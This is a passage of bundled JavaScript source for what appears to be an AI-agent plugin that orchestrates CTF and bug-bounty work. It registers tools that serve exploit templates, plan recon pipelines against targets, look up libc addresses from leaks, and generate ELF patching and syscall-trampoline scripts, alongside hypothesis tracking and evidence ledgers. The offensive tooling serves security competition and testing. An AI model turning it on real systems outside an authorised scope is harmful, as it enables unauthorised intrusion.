`) : "    (no experiments)";
      lines.push(`  ${r.id} [${r.status}] ${r.hypothesis}`);
      lines.push(expSummary);
    }
    return lines.join(`
`);
  }
}

// src/tools/analysis-tools.ts
import { randomUUID } from "crypto";
var schema3 = tool.schema;
function createAnalysisTools(store, notesStore, config3) {
  return {
    ctf_orch_exploit_template_list: tool({
      description: "List built-in exploit templates by domain",
      args: {
        domain: schema3.enum(["PWN", "CRYPTO", "WEB", "WEB3", "REV", "FORENSICS", "MISC"]).optional(),
        session_id: schema3.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        const domain3 = args.domain;
        const templates = listExploitTemplates(domain3);
        return JSON.stringify({ sessionID, domain: domain3 ?? "ALL", templates }, null, 2);
      }
    }),
    ctf_orch_exploit_template_get: tool({
      description: "Get a built-in exploit template by id",
      args: {
        domain: schema3.enum(["PWN", "CRYPTO", "WEB", "WEB3", "REV", "FORENSICS", "MISC"]),
        id: schema3.string().min(1),
        session_id: schema3.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        const entry = getExploitTemplate(args.domain, args.id);
        if (!entry) {
          return JSON.stringify({ ok: false, reason: "template not found", sessionID, domain: args.domain, id: args.id }, null, 2);
        }
        return JSON.stringify({ ok: true, sessionID, template: entry }, null, 2);
      }
    }),
    ctf_auto_triage: tool({
      description: "Auto-triage a challenge file: detect type, suggest target, generate scan commands",
      args: {
        file_path: schema3.string().min(1),
        file_output: schema3.string().optional()
      },
      execute: async (args) => {
        const result = triageFile(args.file_path, args.file_output);
        return JSON.stringify(result, null, 2);
      }
    }),
    ctf_flag_scan: tool({
      description: "Scan text for flag patterns and return candidates",
      args: {
        text: schema3.string().min(1),
        source: schema3.string().default("manual"),
        custom_pattern: schema3.string().optional()
      },
      execute: async (args) => {
        if (args.custom_pattern) {
          setCustomFlagPattern(args.custom_pattern);
        }
        const found = scanForFlags(args.text, args.source);
        return JSON.stringify({
          found,
          alert: found.length > 0 ? buildFlagAlert(found) : null,
          allCandidates: getCandidates()
        }, null, 2);
      }
    }),
    ctf_pattern_match: tool({
      description: "Match known CTF/security patterns in text",
      args: {
        text: schema3.string().min(1),
        target_type: schema3.enum(["WEB_API", "WEB3", "PWN", "REV", "CRYPTO", "FORENSICS", "MISC", "UNKNOWN"]).optional()
      },
      execute: async (args) => {
        const targetType = args.target_type;
        const matches = matchPatterns(args.text, targetType);
        return JSON.stringify({
          matches,
          summary: matches.length > 0 ? buildPatternSummary(matches) : "No patterns matched."
        }, null, 2);
      }
    }),
    ctf_recon_pipeline: tool({
      description: "Plan a multi-phase BOUNTY recon pipeline for a target",
      args: {
        target: schema3.string().min(1),
        scope: schema3.array(schema3.string()).optional(),
        templates: schema3.string().optional()
      },
      execute: async (args, context) => {
        const state = store.get(context.sessionID);
        const pipeline = planReconPipeline(state, config3, args.target, { scope: args.scope });
        return JSON.stringify({ pipeline, templates: args.templates ?? null }, null, 2);
      }
    }),
    ctf_delta_scan: tool({
      description: "Save/query/compare scan snapshots for delta-aware scanning",
      args: {
        action: schema3.enum(["save", "query", "should_rescan"]),
        target: schema3.string().min(1),
        template_set: schema3.string().default("default"),
        findings: schema3.array(schema3.string()).optional(),
        hosts: schema3.array(schema3.string()).optional(),
        ports: schema3.array(schema3.number()).optional(),
        max_age_ms: schema3.number().optional()
      },
      execute: async (args) => {
        if (args.action === "save") {
          const snapshot = {
            id: randomUUID(),
            target: args.target,
            templateSet: args.template_set,
            timestamp: Date.now(),
            assets: [
              ...args.hosts ?? [],
              ...(args.ports ?? []).map((p) => `port:${String(p)}`)
            ],
            findings: args.findings ?? []
          };
          saveScanSnapshot(snapshot);
          return JSON.stringify({ ok: true, saved: snapshot }, null, 2);
        }
        if (args.action === "query") {
          const current = {
            id: randomUUID(),
            target: args.target,
            templateSet: args.template_set,
            timestamp: Date.now(),
            assets: [
              ...args.hosts ?? [],
              ...(args.ports ?? []).map((p) => `port:${String(p)}`)
            ],
            findings: args.findings ?? []
          };
          const latest = getLatestSnapshot(args.target);
          const delta = latest ? computeDelta(latest, current) : null;
          const summary = buildDeltaSummary(args.target, {
            ...current
          });
          return JSON.stringify({ ok: true, summary, latest, delta }, null, 2);
        }
        if (args.action === "should_rescan") {
          const rescan = shouldRescan(args.target, args.template_set, args.max_age_ms);
          return JSON.stringify({ ok: true, shouldRescan: rescan }, null, 2);
        }
        return JSON.stringify({ ok: false, reason: "unknown action" }, null, 2);
      }
    }),
    ctf_tool_recommend: tool({
      description: "Get recommended security tools for a target type",
      args: {
        target_type: schema3.enum(["WEB_API", "WEB3", "PWN", "REV", "CRYPTO", "FORENSICS", "MISC", "UNKNOWN"])
      },
      execute: async (args) => {
        const tools = recommendedTools(args.target_type);
        return JSON.stringify({ tools }, null, 2);
      }
    }),
    ctf_libc_lookup: tool({
      description: "Lookup libc versions from leaked function addresses",
      args: {
        lookups: schema3.array(schema3.object({
          symbol: schema3.string().min(1),
          address: schema3.string().min(1)
        })),
        compute_base_leaked_address: schema3.string().optional(),
        compute_base_symbol_offset: schema3.number().optional()
      },
      execute: async (args) => {
        const requests = args.lookups.map((l) => ({
          symbolName: l.symbol,
          address: l.address
        }));
        const result = localLookup(requests);
        const summary = buildLibcSummary(result);
        const libcRipUrl = buildLibcRipUrl(requests);
        let base = null;
        if (args.compute_base_leaked_address && typeof args.compute_base_symbol_offset === "number") {
          base = computeLibcBase(args.compute_base_leaked_address, args.compute_base_symbol_offset);
        }
        return JSON.stringify({ result, summary, libcRipUrl, computedBase: base }, null, 2);
      }
    }),
    ctf_env_parity: tool({
      description: "Check environment parity between local and remote for PWN challenges",
      args: {
        dockerfile_content: schema3.string().optional(),
        ldd_output: schema3.string().optional(),
        binary_path: schema3.string().optional(),
        session_id: schema3.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        const hasRemote = typeof args.dockerfile_content === "string" && args.dockerfile_content.trim().length > 0;
        const hasLocal = typeof args.ldd_output === "string" && args.ldd_output.trim().length > 0;
        if (!hasRemote || !hasLocal) {
          store.setEnvParity(sessionID, false, "Parity baseline requires both remote (dockerfile) and local (ldd) evidence.");
          return JSON.stringify({
            ok: false,
            sessionID,
            reason: "ctf_env_parity requires both dockerfile_content and ldd_output for enforceable parity baseline"
          }, null, 2);
        }
        const remote = {};
        if (args.dockerfile_content) {
          Object.assign(remote, parseDockerfile(args.dockerfile_content));
        }
        const local = {};
        if (args.ldd_output) {
          const parsed = parseLddOutput(args.ldd_output);
          if (parsed) {
            local.libcVersion = parsed.version;
            local.libcPath = parsed.libcPath;
          }
        }
        const report = buildParityReport(local, remote);
        const summary = buildParitySummary(report);
        const localCommands = localEnvCommands();
        store.setEnvParity(sessionID, report.allMatch, summary);
        return JSON.stringify({ report, summary, localCommands }, null, 2);
      }
    }),
    ctf_parity_runner: tool({
      description: "Run local/docker/remote parity comparison on concrete outputs",
      args: {
        local_output: schema3.string().optional(),
        docker_output: schema3.string().optional(),
        remote_output: schema3.string().optional(),
        session_id: schema3.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        const result = runParityRunner({
          localOutput: args.local_output,
          dockerOutput: args.docker_output,
          remoteOutput: args.remote_output
        });
        if (result.checkedPairs > 0) {
          store.setEnvParity(sessionID, result.ok, result.summary);
        }
        return JSON.stringify({ sessionID, ...result }, null, 2);
      }
    }),
    ctf_contradiction_runner: tool({
      description: "Compare expected hypothesis outcomes vs observed runtime output",
      args: {
        hypothesis: schema3.string().default(""),
        expected: schema3.array(schema3.string()).default([]),
        observed_output: schema3.string().default(""),
        expected_exit_code: schema3.number().int().optional(),
        observed_exit_code: schema3.number().int().optional(),
        apply_event: schema3.boolean().default(true),
        session_id: schema3.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        const result = runContradictionRunner({
          hypothesis: args.hypothesis,
          expected: args.expected,
          observedOutput: args.observed_output,
          expectedExitCode: args.expected_exit_code,
          observedExitCode: args.observed_exit_code
        });
        if (result.contradictory && args.apply_event) {
          store.recordFailure(sessionID, "static_dynamic_contradiction", "ctf_contradiction_runner", result.summary);
          store.applyEvent(sessionID, "static_dynamic_contradiction");
        }
        return JSON.stringify({ sessionID, result }, null, 2);
      }
    }),
    ctf_evidence_ledger: tool({
      description: "Append/scoring evidence ledger entries with L0-L3 output",
      args: {
        event: schema3.string().default("manual"),
        evidence_type: schema3.enum([
          "string_pattern",
          "static_reverse",
          "dynamic_memory",
          "behavioral_runtime",
          "acceptance_oracle"
        ]),
        confidence: schema3.number().min(0).max(1).default(0.8),
        summary: schema3.string().default(""),
        source: schema3.string().default("manual"),
        session_id: schema3.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        const entry = {
          at: new Date().toISOString(),
          sessionID,
          event: args.event,
          evidenceType: args.evidence_type,
          confidence: args.confidence,
          summary: args.summary.replace(/\s+/g, " ").trim().slice(0, 240),
          source: args.source
        };
        const persisted = appendEvidenceLedger(notesStore.getRootDirectory(), entry);
        const scored = scoreEvidence([entry]);
        store.setCandidateLevel(sessionID, scored.level);
        return JSON.stringify({ ok: persisted.ok, sessionID, entry, scored, ...persisted.ok ? {} : persisted }, null, 2);
      }
    }),
    ctf_report_generate: tool({
      description: "Generate a CTF writeup or BOUNTY report from session notes",
      args: {
        mode: schema3.enum(["CTF", "BOUNTY"]),
        challenge_name: schema3.string().default("Challenge"),
        worklog: schema3.string().default(""),
        evidence: schema3.string().default(""),
        target_type: schema3.string().optional(),
        flag: schema3.string().optional()
      },
      execute: async (args) => {
        const reportOptions = {
          challengeName: args.challenge_name,
          programName: args.challenge_name
        };
        if (args.target_type) {
          reportOptions.category = args.target_type;
          reportOptions.endpoint = args.target_type;
        }
        if (args.flag) {
          reportOptions.flag = args.flag;
        }
        const report = generateReport(args.mode, args.worklog, args.evidence, reportOptions);
        const markdown = formatReportMarkdown(report);
        return JSON.stringify({ report, markdown }, null, 2);
      }
    }),
    ctf_subagent_dispatch: tool({
      description: "Plan a dispatch for aegis-explore or aegis-librarian subagent",
      args: {
        query: schema3.string().min(1),
        type: schema3.enum(["explore", "librarian", "auto"]).default("auto")
      },
      execute: async (args, context) => {
        const state = store.get(context.sessionID);
        const agentType = args.type === "auto" ? detectSubagentType(args.query) : args.type;
        const plan = agentType === "explore" ? planExploreDispatch(state, args.query) : planLibrarianDispatch(state, args.query);
        return JSON.stringify({ agentType, plan }, null, 2);
      }
    }),
    ctf_rev_loader_vm_detect: tool({
      description: "Detect REV Loader/VM patterns from readelf/strings output. Returns whether reloc patch-and-dump should be prioritized over static decryption.",
      args: {
        readelf_sections: schema3.string().optional(),
        readelf_relocs: schema3.string().optional(),
        strings_output: schema3.string().optional(),
        session_id: schema3.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        const indicator = detectRevLoaderVm(args.readelf_sections, args.readelf_relocs, args.strings_output);
        const forceRelocDump = shouldForceRelocPatchDump(indicator);
        if (forceRelocDump) {
          store.update(sessionID, {
            revLoaderVmDetected: true,
            revVmSuspected: true,
            revStaticTrust: 0
          });
        }
        return JSON.stringify({
          sessionID,
          indicator,
          forceRelocPatchDump: forceRelocDump,
          recommendation: forceRelocDump ? "CRITICAL: Relocation-based VM detected. DO NOT use static decryption. Use reloc patch-and-dump to neutralize runtime clearing, then extract internal buffers via syscall trampoline." : "No strong relocation-VM indicators. Static analysis may be viable, but verify with dynamic runs."
        }, null, 2);
      }
    }),
    ctf_decoy_guard: tool({
      description: "Evaluate flag candidates for decoy status. Auto-triggers DECOY_SUSPECT when flag-like strings are found but oracle fails.",
      args: {
        oracle_passed: schema3.boolean(),
        session_id: schema3.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        const candidates = getCandidates();
        const result = checkForDecoy(candidates, args.oracle_passed);
        if (result.isDecoySuspect) {
          store.update(sessionID, {
            decoySuspect: true,
            decoySuspectReason: result.reason
          });
        }
        return JSON.stringify({
          sessionID,
          ...result,
          action: result.isDecoySuspect ? "DECOY_SUSPECT set. Router will force runtime state extraction mode. Do NOT continue static reversal path." : "No decoy detected. Proceed normally."
        }, null, 2);
      }
    }),
    ctf_replay_safety_check: tool({
      description: "Check if a binary uses memfd/relocation tricks that make standalone re-execution unreliable. Auto-tags results as low-trust.",
      args: {
        strings_output: schema3.string().optional(),
        readelf_output: schema3.string().optional(),
        binary_name: schema3.string().optional(),
        session_id: schema3.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        const result = isReplayUnsafe(args.strings_output, args.readelf_output);
        if (result.unsafe) {
          const state = store.get(sessionID);
          const currentList = state.replayLowTrustBinaries || [];
          const binaryName = args.binary_name || "unknown";
          if (!currentList.includes(binaryName)) {
            store.update(sessionID, {
              replayLowTrustBinaries: [...currentList, binaryName],
              revStaticTrust: Math.max(0, state.revStaticTrust - 0.3)
            });
          }
        }
        return JSON.stringify({
          sessionID,
          ...result,
          warning: result.unsafe ? "WARNING: This binary uses memfd/relocation patterns. Standalone re-execution results should be treated as LOW CONFIDENCE. Run inside original loader/main for accurate results." : "Binary appears safe for standalone re-execution."
        }, null, 2);
      }
    }),
    ctf_rev_rela_patch: tool({
      description: "Generate a Python script to patch RELA entries in an ELF binary to neutralize relocation-based clearing.",
      args: {
        binary_path: schema3.string().min(1),
        section_offset: schema3.number(),
        entry_index: schema3.number(),
        dummy_address: schema3.number().optional()
      },
      execute: async (args) => {
        const script = generateRelaPatchScript(args.binary_path, args.section_offset, args.entry_index, args.dummy_address);
        return JSON.stringify({ script, usage: `python3 patch_rela.py` }, null, 2);
      }
    }),
    ctf_rev_syscall_trampoline: tool({
      description: "Generate x86_64 syscall trampoline assembly for extracting runtime buffers from patched binaries.",
      args: {
        write_addr1: schema3.number(),
        write_len1: schema3.number(),
        write_addr2: schema3.number(),
        write_len2: schema3.number()
      },
      execute: async (args) => {
        const asm = generateSyscallTrampoline({
          writeAddr1: args.write_addr1,
          writeLen1: args.write_len1,
          writeAddr2: args.write_addr2,
          writeLen2: args.write_len2
        });
        return JSON.stringify({ assembly: asm }, null, 2);
      }
    }),
    ctf_rev_entry_patch: tool({
      description: "Generate a pwntools-based Python script to overwrite an ELF entry point with a syscall trampoline for buffer extraction.",
      args: {
        binary_path: schema3.string().min(1),
        entry_vaddr: schema3.number(),
        write_addr1: schema3.number(),
        write_len1: schema3.number(),
        write_addr2: schema3.number(),
        write_len2: schema3.number()
      },
      execute: async (args) => {
        const script = generateEntryPatchScript(args.binary_path, args.entry_vaddr, {
          writeAddr1: args.write_addr1,
          writeLen1: args.write_len1,
          writeAddr2: args.write_addr2,
          writeLen2: args.write_len2
        });
        return JSON.stringify({ script }, null, 2);
      }
    }),
    ctf_rev_base255_codec: tool({
      description: "Encode/decode data using base255 big-endian scheme (no null bytes).",
      args: {
        mode: schema3.enum(["encode", "decode"]),
        data_hex: schema3.string().min(1),
        chunk_size: schema3.number().default(7)
      },
      execute: async (args) => {
        const input = new Uint8Array((args.data_hex.match(/.{1,2}/g) || []).map((b) => parseInt(b, 16)));
        const result = args.mode === "encode" ? base255Encode(input, args.chunk_size) : base255Decode(input, args.chunk_size);
        const resultHex = Array.from(result).map((b) => b.toString(16).padStart(2, "0")).join("");
        return JSON.stringify({
          mode: args.mode,
          inputLength: input.length,
          outputLength: result.length,
          resultHex
        }, null, 2);
      }
    }),
    ctf_rev_linear_recovery: tool({
      description: "Generate a Python script for linear-equation recovery from dumped (out, expected) buffer pairs.",
      args: {
        dump_dir: schema3.string().min(1),
        bin_count: schema3.number(),
        multiplier: schema3.number(),
        modulus: schema3.number().default(256),
        chunk_size: schema3.number().default(7)
      },
      execute: async (args) => {
        const script = generateLinearRecoveryScript(args.dump_dir, args.bin_count, args.multiplier, args.modulus, args.chunk_size);
        return JSON.stringify({ script }, null, 2);
      }
    }),
    ctf_rev_mod_inverse: tool({
      description: "Compute modular multiplicative inverse.",
      args: {
        value: schema3.number(),
        modulus: schema3.number()
      },
      execute: async (args) => {
        const inv = modInverse(args.value, args.modulus);
        return JSON.stringify({
          value: args.value,
          modulus: args.modulus,
          inverse: inv,
          verification: `${args.value} * ${inv} mod ${args.modulus} = ${args.value * inv % args.modulus}`
        }, null, 2);
      }
    }),
    ctf_hypothesis_register: tool({
      description: "Register a new hypothesis for structured tracking and experiment management.",
      args: {
        hypothesis: schema3.string().min(1),
        tags: schema3.string().optional()
      },
      execute: async (args, context) => {
        const rootDir = `${config3.notes.root_dir}/memory`;
        const registry3 = new HypothesisRegistry(rootDir);
        const tags = args.tags ? args.tags.split(",").map((t) => t.trim()) : [];
        const record3 = registry3.createHypothesis(args.hypothesis, tags);
        return JSON.stringify({ created: record3, activeCount: registry3.getActive().length }, null, 2);
      }
    }),
    ctf_hypothesis_experiment: tool({
      description: "Record an experiment result against a registered hypothesis. Prevents duplicate experiments.",
      args: {
        hypothesis_id: schema3.string().min(1),
        description: schema3.string().min(1),
        method: schema3.string().min(1),
        artifact_paths: schema3.string().optional(),
        verdict: schema3.enum(["supports", "refutes", "inconclusive"]),
        evidence: schema3.string().min(1)
      },
      execute: async (args) => {
        const rootDir = `${config3.notes.root_dir}/memory`;
        const registry3 = new HypothesisRegistry(rootDir);
        const artifacts = args.artifact_paths ? args.artifact_paths.split(",").map((p) => p.trim()) : [];
        const exp = registry3.addExperiment(args.hypothesis_id, args.description, args.method, artifacts, args.verdict, args.evidence);
        if (!exp)
          return JSON.stringify({ error: `Hypothesis ${args.hypothesis_id} not found` });
        const record3 = registry3.get(args.hypothesis_id);
        return JSON.stringify({ experiment: exp, hypothesis: record3 }, null, 2);
      }
    }),
    ctf_hypothesis_summary: tool({
      description: "Get a structured summary of all registered hypotheses and their experiments.",
      args: {},
      execute: async () => {
        const rootDir = `${config3.notes.root_dir}/memory`;
        const registry3 = new HypothesisRegistry(rootDir);
        const summary = registry3.summarize();
        const active = registry3.getActive();
        return JSON.stringify({
          summary,
          totalHypotheses: registry3.getAll().length,
          activeHypotheses: active.length,
          active: active.map((h) => ({
            id: h.id,
            hypothesis: h.hypothesis,
            experimentCount: h.experiments.length
          }))
        }, null, 2);
      }
    }),
    ctf_unsat_gate_status: tool({
      description: "Check UNSAT claim gate status. Returns which conditions are met/missing for making an UNSAT claim.",
      args: {
        session_id: schema3.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        const state = store.get(sessionID);
        const conditions = {
          crossValidation: { met: state.unsatCrossValidationCount >= 2, count: state.unsatCrossValidationCount, required: 2 },
          unhookedOracle: { met: state.unsatUnhookedOracleRun },
          artifactDigest: { met: state.unsatArtifactDigestVerified },
          alternativeHypotheses: { met: state.alternatives.filter((a) => a.trim()).length >= 2, count: state.alternatives.filter((a) => a.trim()).length, required: 2 }
        };
        const allMet = Object.values(conditions).every((c) => c.met);
        return JSON.stringify({
          sessionID,
          gatePassed: allMet,
          conditions,
          action: allMet ? "All UNSAT gate conditions met. UNSAT claim is permitted." : "UNSAT gate BLOCKED. Satisfy all conditions before making an UNSAT claim."
        }, null, 2);
      }
    }),
    ctf_unsat_record_validation: tool({
      description: "Record one of the 3 required UNSAT validation conditions: cross-validation, unhooked-oracle, or artifact-digest.",
      args: {
        condition: schema3.enum(["cross_validation", "unhooked_oracle", "artifact_digest"]),
        evidence: schema3.string().min(1),
        session_id: schema3.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        const state = store.get(sessionID);
        const updates = {};
        if (args.condition === "cross_validation") {
          updates.unsatCrossValidationCount = state.unsatCrossValidationCount + 1;
        } else if (args.condition === "unhooked_oracle") {
          updates.unsatUnhookedOracleRun = true;
        } else if (args.condition === "artifact_digest") {
          updates.unsatArtifactDigestVerified = true;
        }
        store.update(sessionID, updates);
        notesStore.recordScan(`UNSAT validation [${args.condition}]: ${args.evidence}`);
        return JSON.stringify({
          sessionID,
          condition: args.condition,
          recorded: true,
          evidence: args.evidence
        }, null, 2);
      }
    }),
    ctf_oracle_progress: tool({
      description: "Record oracle test progress (pass count, fail index, total tests). Used for Oracle-first scoring.",
      args: {
        pass_count: schema3.number(),
        fail_index: schema3.number(),
        total_tests: schema3.number(),
        session_id: schema3.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        const state = store.get(sessionID);
        const previous = {
          passCount: state.oraclePassCount,
          failIndex: state.oracleFailIndex,
          totalTests: state.oracleTotalTests
        };
        store.update(sessionID, {
          oraclePassCount: args.pass_count,
          oracleFailIndex: args.fail_index,
          oracleTotalTests: args.total_tests
        });
        const { computeOracleProgress: computeOracleProgress2 } = await Promise.resolve().then(() => (init_evidence_ledger(), exports_evidence_ledger));
        const progress = computeOracleProgress2({ passCount: args.pass_count, failIndex: args.fail_index, totalTests: args.total_tests }, previous.totalTests > 0 ? previous : undefined);
        return JSON.stringify({
          sessionID,
          progress,
          action: progress.improved ? `Oracle progress IMPROVED: ${(progress.passRate * 100).toFixed(1)}% pass rate. Keep this approach.` : `Oracle progress NOT improved: ${(progress.passRate * 100).toFixed(1)}% pass rate. Consider pivoting.`
        }, null, 2);
      }
    })
  };
}

// src/tools/control-tools.ts
init_evidence_ledger();
import { randomUUID as randomUUID2 } from "crypto";
import {
  appendFileSync as appendFileSync4,
  existsSync as existsSync11,
  mkdirSync as mkdirSync7,
  readFileSync as readFileSync10,
  readdirSync as readdirSync2,
  statSync as statSync4
} from "fs";
import { isAbsolute as isAbsolute3, join as join12, relative as relative2, resolve as resolve4 } from "path";
var schema4 = tool.schema;
var FAILURE_REASON_VALUES = [
  "verification_mismatch",
  "tooling_timeout",
  "context_overflow",
  "hypothesis_stall",
  "unsat_claim",
  "static_dynamic_contradiction",
  "exploit_chain",
  "environment"
];
function createControlTools(store, notesStore, config3, projectDir, client, parallelBackgroundManager) {
  const hasError3 = hasErrorResponse;
  const validateEventPhaseTransition = (event, phase) => {
    if (event === "scan_completed" && phase !== "SCAN") {
      return `Event '${event}' is only valid in SCAN phase (current=${phase}).`;
    }
    if (event === "plan_completed" && phase !== "PLAN") {
      return `Event '${event}' is only valid in PLAN phase (current=${phase}).`;
    }
    if ((event === "verify_success" || event === "verify_fail") && phase !== "VERIFY") {
      return `Event '${event}' is only valid in VERIFY phase (current=${phase}).`;
    }
    if ((event === "submit_accepted" || event === "submit_rejected") && phase !== "SUBMIT") {
      return `Event '${event}' is only valid in SUBMIT phase (current=${phase}).`;
    }
    return null;
  };
  const extractAgentModels = (opencodePath) => {
    if (!opencodePath)
      return [];
    let parsed;
    try {
      parsed = safeJsonParse(readFileSync10(opencodePath, "utf-8"));
    } catch {
      return [];
    }
    if (!isRecord(parsed))
      return [];
    const agentCandidate = isRecord(parsed.agent) ? parsed.agent : isRecord(parsed.agents) ? parsed.agents : null;
    if (!agentCandidate)
      return [];
    const models = [];
    for (const value of Object.values(agentCandidate)) {
      if (!isRecord(value))
        continue;
      const m = value.model;
      if (typeof m === "string" && m.trim().length > 0) {
        models.push(m.trim());
      }
    }
    return [...new Set(models)];
  };
  const getClaudeCompatibilityReport = () => {
    const settingsDir = join12(projectDir, ".claude");
    const settingsFiles = [
      join12(settingsDir, "settings.json"),
      join12(settingsDir, "settings.local.json")
    ].filter((p) => existsSync11(p));
    const rulesDir = join12(settingsDir, "rules");
    let ruleMdFiles = 0;
    try {
      if (existsSync11(rulesDir)) {
        const stack = [rulesDir];
        while (stack.length > 0 && ruleMdFiles < 200) {
          const dir = stack.pop();
          const entries = readdirSync2(dir, { withFileTypes: true });
          for (const e of entries) {
            const p = join12(dir, e.name);
            if (e.isDirectory()) {
              stack.push(p);
              continue;
            }
            if (e.isFile() && e.name.toLowerCase().endsWith(".md")) {
              ruleMdFiles += 1;
            }
          }
        }
      }
    } catch {
      ruleMdFiles = 0;
    }
    const mcpPath = join12(projectDir, ".mcp.json");
    const servers = [];
    if (existsSync11(mcpPath)) {
      try {
        const raw = readFileSync10(mcpPath, "utf-8");
        const parsed = safeJsonParse(raw);
        const candidate = isRecord(parsed) && isRecord(parsed.mcpServers) ? parsed.mcpServers : isRecord(parsed) ? parsed : null;
        if (candidate) {
          for (const [name, value] of Object.entries(candidate)) {
            if (!isRecord(value)) {
              continue;
            }
            const type = typeof value.type === "string" ? value.type : undefined;
            servers.push({ name, type });
          }
        }
      } catch {
        servers.length = 0;
      }
    }
    return {
      settings: { files: settingsFiles.map((p) => p) },
      rules: { dir: rulesDir, mdFiles: ruleMdFiles },
      mcp_json: { path: mcpPath, found: existsSync11(mcpPath), servers }
    };
  };
  const providerIdFromModel4 = (model) => {
    const trimmed = model.trim();
    const idx = trimmed.indexOf("/");
    if (idx === -1)
      return trimmed;
    return trimmed.slice(0, idx);
  };
  const normalizeSubagentType = (raw) => {
    const normalized = baseAgentName(raw.trim());
    return normalized.trim();
  };
  const isValidModelID = (raw) => /^[^/\s]+\/[^/\s]+$/.test(raw.trim());
  const isValidVariantID = (raw) => /^[A-Za-z0-9][A-Za-z0-9._-]{0,63}$/.test(raw.trim());
  const modelIdFromModel = (model) => {
    const trimmed = model.trim();
    const idx = trimmed.indexOf("/");
    if (idx === -1)
      return "";
    return trimmed.slice(idx + 1);
  };
  const isInteractiveEnabledForSession = (sessionID) => {
    if (config3.interactive.enabled)
      return true;
    const state = store.get(sessionID);
    if (state.mode !== "CTF")
      return false;
    return config3.interactive.enabled_in_ctf !== false;
  };
  const extractSessionApi = () => {
    const session = client?.session;
    if (!session || typeof session !== "object")
      return null;
    return session;
  };
  const callPrimaryThenFallback = async (params) => {
    try {
      const primary = await params.fn(params.primaryArgs);
      const data = params.extractData(primary);
      if (data !== null) {
        return { ok: true, data };
      }
    } catch (error92) {}
    try {
      const fallback = await params.fn(params.fallbackArgs);
      const data = params.extractData(fallback);
      if (data !== null) {
        return { ok: true, data };
      }
    } catch (error92) {
      const message = error92 instanceof Error ? error92.message : String(error92);
      return { ok: false, reason: message };
    }
    return { ok: false, reason: params.unexpectedReason };
  };
  const callSessionList = async (directory, limit) => {
    const sessionApi = extractSessionApi();
    const listFn = sessionApi?.list;
    if (typeof listFn === "function") {
      const listed = await callPrimaryThenFallback({
        fn: listFn,
        primaryArgs: { query: { directory, limit } },
        fallbackArgs: { directory, limit },
        extractData: (result) => {
          const candidate = isRecord(result) ? result.data : null;
          return Array.isArray(candidate) ? candidate : null;
        },
        unexpectedReason: "unexpected session.list response"
      });
      if (listed.ok) {
        return { ok: true, data: listed.data };
      }
    }
    const sessionClient = extractSessionClient(client);
    if (!sessionClient) {
      return { ok: false, reason: "SDK session client not available" };
    }
    try {
      const statusMap = await sessionClient.status({ query: { directory } });
      const map3 = isRecord(statusMap?.data) ? statusMap.data : isRecord(statusMap) ? statusMap : {};
      const ids = Object.keys(map3);
      const sliced = typeof limit === "number" && limit > 0 ? ids.slice(0, limit) : ids;
      const synthesized = sliced.map((id) => {
        const item = map3[id];
        const status = isRecord(item) && typeof item.type === "string" ? item.type : undefined;
        return { id, status };
      });
      return { ok: true, data: synthesized };
    } catch (error92) {
      const message = error92 instanceof Error ? error92.message : String(error92);
      return { ok: false, reason: message };
    }
  };
  const callSessionMessages = async (directory, sessionID, limit) => {
    const sessionClient = extractSessionClient(client);
    if (!sessionClient) {
      return { ok: false, reason: "SDK session client not available" };
    }
    const res = await callPrimaryThenFallback({
      fn: sessionClient.messages,
      primaryArgs: { path: { id: sessionID }, query: { directory, limit } },
      fallbackArgs: { sessionID, directory, limit },
      extractData: (result) => {
        if (hasError3(result) || !isRecord(result))
          return null;
        const data = result.data;
        return Array.isArray(data) ? data : null;
      },
      unexpectedReason: "unexpected session.messages response"
    });
    return res.ok ? { ok: true, data: res.data } : { ok: false, reason: res.reason };
  };
  const ensureInsideProject = (candidatePath) => {
    const abs = isAbsolute3(candidatePath) ? resolve4(candidatePath) : resolve4(projectDir, candidatePath);
    const rel = relative2(projectDir, abs);
    if (!rel || !rel.startsWith("..") && !isAbsolute3(rel)) {
      return { ok: true, abs };
    }
    return { ok: false, reason: "path escapes project directory" };
  };
  const buildEmptyGraph = () => {
    const now = new Date().toISOString();
    return {
      format: "aegis-knowledge-graph",
      version: 1,
      revision: 0,
      createdAt: now,
      updatedAt: now,
      entities: [],
      relations: []
    };
  };
  const graphPaths = () => {
    const resolved = ensureInsideProject(config3.memory.storage_dir);
    if (!resolved.ok) {
      return { ok: false, reason: `memory.storage_dir ${resolved.reason}` };
    }
    return { ok: true, dir: resolved.abs, file: join12(resolved.abs, "knowledge-graph.json") };
  };
  const GRAPH_DEFER_FLUSH_MS = 45;
  const GRAPH_DEFER_MAX_RETRIES = 3;
  let graphCache = null;
  let graphDirty = false;
  let graphFlushTimer = null;
  let graphDeferredRetryCount = 0;
  const clearGraphFlushTimer = () => {
    if (graphFlushTimer) {
      clearTimeout(graphFlushTimer);
      graphFlushTimer = null;
    }
  };
  const flushGraph = (options) => {
    if (!graphDirty || !graphCache) {
      return {
        ok: true,
        mode: "immediate",
        revision: graphCache?.revision ?? 0
      };
    }
    const paths = graphPaths();
    if (!paths.ok)
      return paths;
    try {
      mkdirSync7(paths.dir, { recursive: true });
      const now = new Date().toISOString();
      graphCache.updatedAt = now;
      graphCache.revision = (graphCache.revision ?? 0) + 1;
      const pretty = options?.pretty !== false;
      const json3 = pretty ? JSON.stringify(graphCache, null, 2) : JSON.stringify(graphCache);
      atomicWriteFileSync(paths.file, `${json3}
`);
      graphDirty = false;
      graphDeferredRetryCount = 0;
      return {
        ok: true,
        mode: "immediate",
        revision: graphCache.revision
      };
    } catch (error92) {
      const message = error92 instanceof Error ? error92.message : String(error92);
      return { ok: false, reason: message };
